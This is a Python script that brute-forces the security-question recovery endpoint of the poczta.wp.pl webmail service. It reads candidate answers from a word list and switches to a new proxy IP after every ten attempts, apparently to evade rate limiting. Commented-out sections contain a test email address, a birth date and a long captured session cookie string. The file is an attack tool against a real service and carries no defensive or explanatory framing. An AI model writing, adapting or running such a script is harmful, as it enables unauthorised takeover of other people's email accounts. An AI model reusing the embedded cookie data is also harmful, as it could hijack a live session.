import urllib.request, urllib.error, urllib.response, urllib.parse
import json, os


attemps_per_one_IP = 10

headers = {
    "Host": "poczta.wp.pl",
}
url = "https://poczta.wp.pl/api/v1/public/recovery/qa"

with open("password_list.txt") as f:
    list_of_passwords = [line.rstrip() for line in f]

with open("IP_list.txt") as f:
    proxy_list = [line.rstrip() for line in f]

counter = 0
index = 0

if attemps_per_one_IP * len(proxy_list) < len(list_of_passwords):
    print(
        f"It's too much answers (`{len(list_of_passwords)}`) to check for `{len(proxy_list)}` IPs! Incease the number of attemps per one IP or decrease the number of answers"
    )
else:
    for password in list_of_passwords:
        if counter < 10:
            # dataa = (
            #     '{"email":"testowe10071997@wp.pl","answers":["'
            #     + answer
            #     + '"],"birthDate":"1997-07-10"}'
            # )
            fileObj = open(
                "form.json",
            )
            jsonDict = json.load(fileObj)
            for key in jsonDict:
                if type(jsonDict[key]) == str:
                    if "$" in jsonDict[key]:
                        jsonDict[key] = os.path.expandvars(os.getenv(key, password))
                elif type(jsonDict[key]) == list:
                    if "$" in jsonDict[key][0]:
                        jsonDict[key][0] = os.path.expandvars(
                            os.getenv(key[0], password)
                        )
                else:
                    pass
            # data = json.dumps(
            #     {
            #         "email": "testowe10071997@wp.pl",
            #         "answers": [answer],
            #         "birthDate": "1997-07-10",
            #     }
            # )
            data = json.dumps(jsonDict)
            print(data)

            data_bytes = str.encode(data)
            print(f"IP: {proxy_list[index]}, Data: {data}")
            proxy_handler = urllib.request.ProxyHandler({"http": proxy_list[index]})
            opener = urllib.request.build_opener(proxy_handler)
            opener.addheaders = [("User-agent", "Mozilla/5.0")]
            # opener.addheaders = [
            #     (
            #         "Cookie",
            #         "WPabs=237b8c, statid=e41d71643df03f72f541cb7c16f40495=095341=1634499518=v3, PWA_adbd=0, wp_dark_c=%5B1634502346%2C1634502346%2C0%2C0%5D, sgv=1634502346, WPdp=lybF1s1PDRAVgJAGApAVkhUX01XXEtRWklSWklOThQQTkNQQFsBB1tYXlVADwoSBR1AVls5XVVQQEpOWFVXQE9OW1VaQEBOXUk%2FTlVAAQ1AVkpOTgwDTkNTEVVAKy4yTkMZTg0RTkNTWkpWWUlQX09SXE9SQFsPHltYXlVADxJAVktOThoRHBAGTkNAN0hOXlVRQE1OWVVUQE5OVFVbQEhSMVtOThQWTkNREVVAOClAVgJAGApAVkhUX01XXEtRWklSWklOThQQTkNQQFsBB1tYXlVADwoSBR1AVls5XSRAQFsPGFtYXwQf, WPtcs2=CPOPUPbPOPUPbBIACCPLBxCgAP_AAH_AAB5YISNf_X__bX9j-_59f_t0eY1P9_r_v-Qzjhfdt-8F2L_W_L0X42E7NF36pq4KuR4Eu3LBIQNlHMHUTUmwaokVrzHsak2MryNKJ7LEmnMZO2dYGHtPn91TuZKY7_78__fz3z-v_t_-39T37-3_3__5_X---_e_V399zLv9____39nN___9v-_BCEAkw1LyALsSxwZNo0qhRAjCsJDoBQAUUAwtEVgAwOCnZWAR6ghYAITUBGBECDEFGDAIABAIAkIiAkALBAIgCIBAACAFSAhAARMAgsALAwCAAUA0LECKAIQJCDI4KjlMCAiRaKCWysASg72NMIQyywAoFH9FRgIlCCBYGQkLBzHAEgJcLJAA.YAAAAAAAAAAA, _gcl_au=1.1.83309534.1634502361, _hjid=8a6a28e0-22a8-4dc5-9487-9f6964cb366f, _fbp=fb.1.1634502361863.223899713, pubmaticuid=12DF80EF-F12C-4CE4-AA5A-F5D538825025, cto_bundle=KXjWU19BOHZxdHNjUjMwdmdkdko0a05jM3hudlJNbjB5Q05aajJrSUFFVVE1dnFuJTJGWnpZbE5VZE1RdENCelI3RTZqeWpzWGhUSklFa0dCbWtnRzl1NjNoaWtuUFRwWGhLa21CeCUyRnJaa0xidHpxVkN5WFV1NVNTM3p0dmc4Sjc2bmRXVW9ubWRIaHRxcXJzTElBWmhQN3pJOFRBJTNEJTNE, ixuid=YWyG2.KlIhC9Db9nkkFVcgAA&1120, _ga=GA1.2.e41d71643df03f72f541cb7c16f40495%253A095341%253A1634499518%253Av3, __gads=ID=0fcffa351b29f55b=T=1634502364=S=ALNI_MYer29Z9TrU4ibflcqudBQMiiexvQ, ACac2=eJwyNDM2MbUwMDK3rAEEAAD//w27Aoo=, STac=ac%3Ae41d71643df03f72f541cb7c16f40495=1634580219=v1, __gfp_64b=Ry4Q.fMcRmMNVJG3tSn0RBwlSaSH_eEetyrL4jp9byL.07|1634499518, sa31=5dc6e478e0db5bf33e5e0c0e125c8bbc, sa32=validate_error, WPpds=3, BDh=HMbBDcAgCAXQXf7ZA3ywUbahLS5h3L1Jb2+DQlVBbAjdpAZCvaG/Wc6J0Iara+btv+dYw1dHmDXMKtqTCJ7zAQAA//8BAAD//w==, BDhs=RMpBDoAwCADBv+yZA9AWka81/N1ojF53Z+PqZkptbE3KBY+kTAhVah5CjkFZy2t93fq5+cf44tl9AQAA//8BAAD//w==, STpage=profil_nh_dynamic=https%3A%2F%2Fpoczta.wp.pl%2Fodzyskaj%2F=1635264284=119021c51374ce71768b=v1, STvisit=3e0e890283c26d4664a766e969f5f4d1=451fb8=1635264230=1635264284=6====2=1=v2",
            #     )
            # ]
            urllib.request.install_opener(opener)
            # sock = urllib.request.urlopen("http://ident.me/")
            request = urllib.request.Request(url, data=data_bytes)
            with urllib.request.urlopen(request, timeout=10) as response:
                print(response.status)
            counter = counter + 1
        else:
            index = index + 1
            counter = 0

# for pr in proxy_list:
#     proxy = {"http": pr}
#     data = (
#         '{"email":"testowe10071997@wp.pl","answers":["'
#         + ans
#         + '"],"birthDate":"1997-07-10"}'
#     )
#     print(f"IP: {pr}, Data: {data}")
# response = requests.post(
#     "https://poczta.wp.pl/api/v1/public/recovery/qa",
#     proxies=proxy,
#     headers=headers,
#     cookies=cookies,
#     data=data,
#     verify=False,
# )
# print(response)
